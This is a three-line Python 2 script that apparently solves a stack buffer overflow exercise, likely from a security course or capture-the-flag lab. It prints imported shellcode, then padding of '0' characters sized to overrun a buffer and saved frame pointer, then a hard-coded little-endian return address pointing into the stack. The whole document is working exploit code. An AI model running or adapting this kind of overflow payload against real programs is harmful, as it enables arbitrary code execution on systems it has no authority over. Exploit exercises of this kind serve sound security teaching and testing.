from shellcode import shellcode
from struct import pack
print shellcode + "0" * (0x6c + 4 - 23) + pack("<I", 0xbffe9c5c)
